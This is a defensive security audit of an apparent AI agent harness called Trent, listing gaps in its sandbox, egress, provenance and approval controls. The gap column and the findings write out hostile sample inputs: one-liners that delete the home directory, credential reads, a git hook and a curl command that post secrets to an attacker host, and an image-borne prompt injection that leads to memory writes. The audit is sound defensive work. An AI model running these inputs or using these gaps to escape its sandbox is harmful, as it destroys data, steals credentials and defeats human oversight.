# Trent security posture: defenses and gaps by attack class (2026-09-26)

Defensive audit of Trent Fleet's own harness. Read-only pass over
`packages/trent-core/src` and `apps/cli`. Goal framing: Trent must be *strictly more
secure than Hermes* and let a user *feel safe*. Trent's machinery is real and mostly
strong; this report maps where each class is defended (file:line), how strong that is,
and the concrete gap with the input that would slip through.

`apps/web/**` is READ ONLY — app-side findings are marked **(report only)**.

Method note: verified the claimed model in `docs/security.md` against the actual
implementation. Most claims hold. The gaps below are places where the code is narrower
than the prose, or where a headline claim ("cannot reach a host nobody allowlisted") is
only conditionally true.

---

## Per-class table

| # | Class | Trent defense (file:line) | Strength | Gap (file:line + input that slips through) |
|---|---|---|---|---|
| 1 | Command / hardline bypass | `governance/hardline.ts:135` (`HARDLINE_RULES`); deobfuscator `tools/approval-floors.ts:135` (`detectionVariants`) NFKC/ANSI/`$IFS`/env/basename/`sh -c` recursion depth 3; `approval-patterns.ts:67,89` two tiers; matched inside `execute` | **Partial** | Interpreter payloads are never extracted or scanned: `shellPayloads` (`approval-floors.ts:129`, `SHELL_PAYLOAD`) only unwraps `sh/bash/zsh/ksh/dash -c` and `eval`. Input: `python3 -c 'import os,shutil; shutil.rmtree(os.path.expanduser("~"))'`, or `node -e 'require("child_process").execSync("rm -rf ~")'`, or `perl -e`. None reach the `rm`/home-delete rules. Also `cat ~/.aws/credentials` — hardline read-block covers `~/.ssh` + Trent files only (`hardline.ts:184` `isTrentReadTarget`), not `~/.aws`, `~/.config/gcloud`, `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.docker/config.json`. (Docs concede "guardrail, not a sandbox"; containment is the sandbox — but see class 6.) |
| 2 | File path traversal / self-modify | `tools/file_ops/paths.ts:82` `resolveWorkspacePath`: realpath-after-symlink confinement, NUL reject, spillover read-only; `deniedReason:41` (.env, .git/config, mcp-tokens, docker.sock, ~/.ssh, ~/.aws); protected instruction files `:31` | **Partial** | `.git/hooks/` is NOT denied — only `.git/config` (`paths.ts:44`). Input: `write_file(".git/hooks/pre-commit", "#!/bin/sh\ncurl -d @~/.aws/credentials evil…")` — inside workspace, passes confinement, executes on the user's next `git commit` **outside the sandbox**. Also `deniedReason` blocks `~/.aws` but hardline (terminal) does not (class 1). |
| 3 | Egress / SSRF / metadata / redirects | `tools/web/url-safety.ts:130` `checkUrlSafety` (scheme, secret-query, metadata `:29`, RFC1918/loopback/link-local/CGNAT, IPv4-mapped-IPv6 `:63`, DNS-of-every-A); `proxied-fetch.ts:126` `nextRedirectHop` re-checks every hop, drops creds+body cross-origin; broker binds secret to host (`egress/host-binding.ts`); business fail-closed (`business/build.ts:24`); vision/mcp/browser/a2a all call `checkUrlSafety` | **Partial** | **`social` toolset uses raw global `fetch`** (`social/publish.ts:56` `fetchImpl ?? ((u,i)=>fetch(u,i))`), and `tools/index.ts:331` passes it no egress-derived transport and does **not** gate it on egress presence (unlike web/business at `:345`,`:337`). No `checkUrlSafety`, no proxy. Bounded because it uses the user's own connect tokens to fixed provider hosts and media is local files — but it is the one outbound toolset outside the SSRF floor. `media` image/transcription also default to raw `fetch` (`media/image.ts:219`) with no egress passed at `tools/index.ts:328` (host-side, real keys, fixed base URL). Redirect/metadata handling itself is **Strong**. |
| 4 | Indirect prompt injection / provenance | `governance/provenance.ts:42` `UNTRUSTED_ADAPTERS = [web,browser,mcp,plugins,inbound]`; taint accumulates per step (`:108`), gates memory writes (held) and skill writes (denied) — `DEFAULT_PROVENANCE_POLICY:74`; fleet-memory hook wrapped by `tools/memory/gate.ts`; workspace files scanned `cron/prompt-scan.ts` | **Partial** | `vision`, `media`, `a2a` are **absent from `UNTRUSTED_ADAPTERS`** (`provenance.ts:42`). Vision fetches a remote image (`vision/image-source.ts:86`) and returns its description as **trusted**; an image with embedded/typographic instructions, then a `memory add` in the same step, is **not** held. A2A peer output (`a2a/`) is remote content but tagged trusted. Input: `ask_vision(url=attacker.png)` → `memory_add(...)` writes without a hold. Also (docs-admitted) a *fleet* run that read an inbox/page without a webhook is not stamped `untrusted_inbound` for auto-review. Nothing inspects text for instructions (by design). |
| 5 | Data-exfil channels | Redaction boundary `telemetry/redact.ts` one definition, reused by hooks/OTel/session export; `hasSecretShapedQuery` blocks creds in URLs (`url-safety.ts:117`); markdown image auto-render is not a Trent output surface (CLI) | **Partial** | The egress firewall gap (class 6) is the real exfil channel: from the bridge-networked egress container an agent POSTs workspace data to any host. Secondary: `social`/`media` raw `fetch` (class 3) is an un-proxied outbound path. Tool params to an attacker host are blocked only for proxy-aware clients. |
| 6 | Sandbox strength | `terminal/DockerBackend.ts:114` `buildCreateArgs`: `execFile`+argv (no host shell), `--network none` default (`:85`), `--cap-drop=ALL` (`:119`), `--security-opt=no-new-privileges` (`:120`), `--pids-limit` 256; env from `buildSandboxEnv` only (no `process.env` merge); workspace bind only (`sandbox.ts:92`), spillover ro | **Partial** | The **egress** container runs on the *default docker `bridge`* (`sandbox.ts:23` `DEFAULT_BRIDGE="bridge"`, used `:79`) with `host.docker.internal:host-gateway` (`:103`) and **no `--internal` network and no L3 egress firewall**. The allowlist is enforced only by `HTTPS_PROXY` env, so any client that ignores it escapes it. Input (network step): `curl --noproxy '*' https://evil.tld -d @/workspace/secret`, a raw socket, or a direct-to-IP client — reaches any internet/LAN host, bypassing `egress.intercept_domains`. This contradicts docs' "cannot reach a host nobody allowlisted." Also `--memory` unset by default (`sandbox.ts:97` sets only `pidsLimit`) → memory-DoS. `LocalBackend` (`sandbox.ts:132`) is not a sandbox at all (documented). |
| 7 | MCP / plugin / skill supply chain | Plugins: manifest is data, no in-process code (`plugins/manifest.ts:5`), tool = shell command run in sandbox with `floorBlock` check (`:88`), manifest must be 0600 non-symlink (`:57`); MCP tool metadata scanned for jailbreak patterns (`mcp/scan.ts:57` `scanMcpTools`); stdio child env scrubbed (`mcp/client.ts:4`) | **Partial** | **No signature/provenance verification** of any MCP server or plugin. An stdio MCP server is an arbitrary host command spawned by `StdioClientTransport` (`mcp/client.ts:171`) — `trent mcp add --command 'npx -y evil-pkg'` executes arbitrary code **on the host** (env-scrubbed, but full FS + un-proxied network). The scan is **post-connect** (must run the server to enumerate tools), so code runs before it is flagged. Mitigated by: adding servers is an operator CLI step, not a seat tool. |
| 8 | Gateway auth | Pairing `gateway/security/PairingManager.ts`: 8-char CSPRNG code from 32-sym alphabet (`:39`, no modulo bias since 256%32=0), TTL 1h (`:12`), max 3/24h/sender (`:14`), default-deny incl. groups (`authorize:96`); webhook HMAC + `timingSafeEqual` + length check: slack `:273`, whatsapp `:150`, line `:126`, homeassistant `:101`, telegram secret-token; email sender-auth via RFC 8601 `checkSenderAuth`, `require_authenticated_from` defaults true (`email.ts:106`) | **Partial** | Email auth is forgeable when `gateway.email.authserv_id` is **unset**: `auth-results.ts` then reads "the first Authentication-Results header of any kind" (`:10-11`), which the sender can prepend (`Authentication-Results: dmarc=pass`) to impersonate a paired address' `senderId`. `mattermost` inbound is unsigned by design (`mattermost.ts:12` "anyone who can reach that URL could press as the admin"). Pairing itself is Strong. |
| 9 | Secret handling | Single redactor `telemetry/redact.ts` + `errors/` recursive envelope; secret routing `config/secrets-policy.ts:18` (4 rules); `.env`/tokens 0600; `config get`→`[set]`; hardline read-block on Trent keys (`hardline.ts:184`); prompt redaction `model-gateway/redact.ts` (opt-in) | **Partial** | **(report only)** `apps/web/lib/model-gateway.ts:269` `console.error("executeSeatModel(...): failed", lastError)` logs the provider error (`lastError` = raw `error.message`, `:268`) with **no `redactText`** — a provider 400 that echoes the objective, or an objective/prompt carrying a secret, lands on stderr unredacted (AGENTS.md defect 8). Compounding: prompt redaction explicitly does **not** cover seat turns (`docs/security.md`: seat turns run through `executeSeatModel`, not the gateway redactor), so a secret in an objective reaches the provider *and* this log. CLI-side redaction is Strong. |
| 10 | Approval model / autonomy | `governance/autonomy.ts` + `autonomy-dispatch.ts`: refuse-floor → class-floor (ask at every level, `never` cannot lift) → level; hardline+deny-glob+approval-floor refused at every level (`autonomy.ts:74`); bound approvals keyed `{runId,stepId,tool,args}` (`bound-approvals.ts`), fail-closed when store not installed; durable approvals survive restart; auto-review only ever narrows, never a send/payment (`auto-review-policy.ts`) | **Strong** | Gate is fail-closed and floors are unliftable; unclassifiable calls are not treated as pure reads (`policy-rules.ts` `classifyCall`, safe direction). Residual: a single "always approve" grants the whole seat loop (`seat-agent-loop.ts:209`, app-side), so the bound-approval per-call check inside `execute` is what actually holds the line — correct, but the whole model leans on that one seam. |
| 11 | Update / release integrity | Installer/`trent update`/`trent desktop install` verify `SHA256SUMS` against embedded minisign (Ed25519) + ECDSA P-256 keys, refuse unsigned; `.github/workflows/release.yml` signs under `umask 077` | **Partial** | **No release has been cut and no tag pushed** (`docs/security.md` "Not yet implemented"), and the repo is private, so the verified-update path is untested in production and the URLs 404. First run is effectively keyless/offline (the artifact you already have). Report-only until a signed release exists. |

---

## Ranked Trent gap list

Severity = risk to the "strictly-more-secure / feel-safe" goal, given default config
(terminal backend `docker`, egress on, autonomy `ask_dangerous`). "Testable property" is
written so a failing test can be added first (repo TDD rule).

### T-01 — Egress container has no L3 firewall; allowlist is proxy-only  *(High · class 6/5)*
The network step runs on the default docker `bridge` with full internet/LAN NAT; the
`egress.intercept_domains` allowlist binds only clients that honor `HTTPS_PROXY`.
- **Testable property:** a command in the egress sandbox that connects directly to a
  public IP or uses `--noproxy '*'` to a non-allowlisted host **fails to connect**
  (connection refused/timeout), not "proxy refused". I.e., the only reachable destination
  is the proxy endpoint.
- **Fix direction:** create the egress network with `--internal` (or an nftables/iptables
  egress policy) so the *only* reachable route is `host.docker.internal:<proxyPort>`;
  drop `host-gateway` breadth to the proxy alone.
- **Files:** `packages/trent-core/src/tools/sandbox.ts` (network creation, `DEFAULT_BRIDGE`),
  `packages/trent-core/src/terminal/DockerBackend.ts` (network flags), a new
  `ensureEgressNetwork` helper; test `terminal/*.test.ts`.

### T-02 — `.git/hooks/` writable via file_ops → code exec outside the sandbox  *(High · class 2)*
`deniedReason` blocks `.git/config` but not `.git/hooks/*`; a hook written into the
workspace runs on the host at the user's next git command.
- **Testable property:** `resolveWorkspacePath(..., "write")` for any path whose resolved
  relative form is under `.git/` (hooks included) throws `PathPolicyError`.
- **Files:** `packages/trent-core/src/tools/file_ops/paths.ts` (`deniedReason`); test
  `file_ops/*.test.ts`.

### T-03 — Vision/media/a2a results are not provenance-tainted  *(High · class 4)*
Content fetched from a remote image (vision), remote media, or an A2A peer is returned as
`trusted`, so a memory/skill write derived from it is not held.
- **Testable property:** a step that calls `ask_vision`/`media_transcribe`/an a2a peer and
  then a `memory` write returns `needs_approval` and writes a `[provenance: untrusted via
  <tool>]` entry only after approval — mirroring `web_extract` in
  `runtime/headless.memory-gate.test.ts`.
- **Files:** `packages/trent-core/src/governance/provenance.ts` (add `vision`, `media`,
  `a2a` to `UNTRUSTED_ADAPTERS`, or tag at the adapter); tests
  `governance/provenance.test.ts`, `runtime/*.memory-gate.test.ts`.

### T-04 — `social` (and `media`) egress bypasses the SSRF floor and proxy  *(Medium · class 3/5)*
`createSocialPorts` defaults to raw global `fetch`; `tools/index.ts` never hands it an
egress transport and never gates it on egress presence.
- **Testable property:** with no `fetchImpl` seam, the social/media adapters route through
  `createEgressFetch`/`checkUrlSafety`, and refuse (skip, like web) when egress is absent.
- **Files:** `packages/trent-core/src/tools/index.ts` (social/media wiring `:328`,`:331`),
  `packages/trent-core/src/tools/social/publish.ts:56`,
  `packages/trent-core/src/tools/social/build*` (add a build gate like `business/build.ts`);
  tests `social/*.test.ts`.

### T-05 — Terminal can read cloud/git/npm credential files that file_ops denies  *(Medium · class 1/9)*
`isTrentReadTarget` read-blocks `~/.ssh` + Trent files only; terminal `cat` of
`~/.aws/credentials`, `~/.config/gcloud/*`, `~/.netrc`, `~/.git-credentials`, `~/.npmrc`,
`~/.docker/config.json` is not floored (file_ops already denies `~/.aws`).
- **Testable property:** the hardline `read-trent-env-or-ssh-keys` rule (or a sibling)
  refuses a command whose path token resolves under any of those credential locations.
- **Files:** `packages/trent-core/src/governance/hardline.ts` (`isTrentReadTarget` /
  new rule + `tools/file_ops/paths.ts` `deniedReason` parity); test `hardline.test.ts`.
  Note: contained on a proper docker backend where these paths are unmounted; this is
  defense-in-depth for LocalBackend and mounted-home setups.

### T-06 — Interpreter payloads escape the hardline/approval floor  *(Medium · class 1)*
`python -c`, `node -e`, `perl -e`, `ruby -e` bodies are not among the deobfuscated
payloads, so destructive intent inside them is invisible to both floors.
- **Testable property:** `floorBlock`/`dangerous` see a destructive spelling expressed via
  `python3 -c '…rmtree(HOME)…'` (extract `-c`/`-e` payloads into `detectionVariants`,
  bounded by depth as `sh -c` already is).
- **Files:** `packages/trent-core/src/tools/approval-floors.ts` (`shellPayloads` /
  `detectionVariants`); tests `approval-floors.test.ts`, `hardline.test.ts`.
  Note: acknowledged design limit ("a command can always be spelled another way");
  containment is the sandbox. Worth the cheap wins (rmtree/os.system spellings).

### T-07 — Trent's own control-plane files are not write-protected  *(Medium · class 10, LocalBackend/mounted-profile)*
Hardline `write-to-trent-secrets` covers `.env`, `workspace-trust.json`, egress
`ca.key/ca.crt/tokens.json` — but **not** `config.yaml`, `hooks-consent.json`,
`gateway.json` (bound-approval store), `approvals-audit.ndjson`, `idempotency.json`.
- **Testable property:** a write (path subject or command with a write verb) targeting any
  of those under `~/.trent`/profileDir is hardline-refused.
- **Impact if reachable:** writing `config.yaml`+`hooks-consent.json` installs+consents an
  arbitrary hook (RCE persistence); writing `gateway.json` forges a bound-approval → a held
  send/payment auto-runs; editing `approvals-audit.ndjson` breaks the (locally) hash-chained
  record.
- **Files:** `packages/trent-core/src/governance/hardline.ts` (`isTrentWriteTarget`,
  `EGRESS_FILES` → a broader `TRENT_CONTROL_FILES`); test `hardline.test.ts`.
  Note: unreachable when profileDir is unmounted from a docker sandbox; real on
  LocalBackend or if the profile is bind-mounted.

### T-08 — MCP stdio server = unverified host code execution  *(Medium · class 7)*
No signature/provenance check; `StdioClientTransport` spawns the configured command on the
host, and the safety scan only runs after the server is connected (already executing).
- **Testable property:** connecting a new stdio MCP server requires an explicit,
  hash-recorded consent (like `trent hooks consent`) before the command is spawned;
  connecting without it refuses.
- **Files:** `packages/trent-core/src/tools/mcp/client.ts` (`connectStdio`),
  `packages/trent-core/src/tools/mcp/config.ts`, `apps/cli/src/commands/groups/*` (mcp add);
  tests `mcp/*.test.ts`. Mitigated by operator-only `trent mcp add`.

### T-09 — Email sender-auth is forgeable without `authserv_id`  *(Medium · class 8)*
When `gateway.email.authserv_id` is unset, the first `Authentication-Results` header of any
kind is trusted, letting a sender forge `dmarc=pass` to match a paired address.
- **Testable property:** with `authserv_id` unset and `require_authenticated_from` true, an
  inbound mail carrying a self-authored `Authentication-Results` header is **refused** (fail
  closed) rather than trusted.
- **Files:** `packages/trent-core/src/gateway/platforms/email/auth-results.ts`,
  `.../email.ts:106`; tests `gateway/platforms/email.*.test.ts`.

### T-10 — No default memory limit on the sandbox  *(Low · class 6)*
`--pids-limit` is set (256) but `--memory` is not, so an agent can OOM the host.
- **Testable property:** `buildCreateArgs` emits `--memory` with a sane default.
- **Files:** `packages/trent-core/src/tools/sandbox.ts` (`create`),
  `packages/trent-core/src/terminal/DockerBackend.ts`; test `terminal/*.test.ts`.

### T-11 — Unredacted seat-turn provider-error log  *(Medium · class 9 — report only)*
`apps/web/lib/model-gateway.ts:269` logs `lastError` (raw provider `error.message`) with no
redaction; seat turns bypass prompt redaction entirely.
- **Testable property (app-side, cannot fix here):** the provider-error log passes through
  `redactText`; the seat port routes through the gateway redactor.
- **Files (READ ONLY):** `apps/web/lib/model-gateway.ts:255-270`,
  `apps/web/lib/agent-runtime.ts`. Report to the app owner (AGENTS.md defect 8).

### T-12 — Signed-release path unexercised; first run keyless  *(Low · class 11 — report only)*
Verification code exists but no tag/release; private repo → installer URLs 404.
- **Testable property:** once a release is cut, `trent update` refuses a tampered
  `SHA256SUMS` and accepts a correctly minisign+ECDSA-signed one against embedded keys.
- **Files:** release tooling + `05_release/output/release-runbook.md` (process, not code).

---

## Bottom line

Trent is materially stronger than Hermes on every class: credential brokering (opaque
token, host-bound), argv-only sandbox exec, cap-drop/no-new-privileges, a unified redactor,
provenance holds on durable writes, unliftable approval floors, and durable
bound-approvals. The approval/autonomy model (class 10) is genuinely fail-closed.

The two findings that most undercut "feel safe" are **T-01** (the egress allowlist is
proxy-honor-only, so a non-allowlisted host *is* reachable — the exact property the docs
claim it is not) and **T-02/T-03** (a `.git/hooks` write escapes the sandbox, and
vision/a2a content drives durable writes untainted). T-04..T-09 are real but narrower or
operator-gated. T-11/T-12 are app-side/release and report-only.
